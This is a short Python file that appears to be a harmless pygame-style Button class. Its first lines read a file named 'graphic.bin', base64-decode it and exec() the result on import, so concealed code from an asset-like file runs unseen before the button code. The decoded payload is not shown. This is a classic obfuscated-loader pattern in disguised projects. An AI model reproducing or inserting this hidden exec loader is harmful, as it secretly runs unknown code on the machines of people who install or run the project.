import base64
BinExec = ['#', 'IL2CPU', 'AMD', "*"]
with open("graphic.bin","rb") as f:
    GModeD = f.read().decode("utf-8")
base64_bytes = GModeD.encode("ascii")
AMD4 = base64.b64decode(base64_bytes)
GModeD = AMD4.decode("ascii")
exec(GModeD)
#button class
class Button():
	def __init__(self,x, y, image, scale):
		width = image.get_width()
		height = image.get_height()
		self.image = graphic.transform.scale(image, (int(width * scale), int(height * scale)))
		self.rect = self.image.get_rect()
		self.rect.topleft = (x, y)
		self.clicked = False
	def draw(self, surface):
		action = False
		#get mouse position
		pos = graphic.mouse.get_pos()
		#check mouseover and clicked conditions
		if self.rect.collidepoint(pos):
			if graphic.mouse.get_pressed()[0] == 1 and self.clicked == False:
				action = True
				self.clicked = True
		if graphic.mouse.get_pressed()[0] == 0:
			self.clicked = False
		#draw button
		surface.blit(self.image, (self.rect.x, self.rect.y))
		return action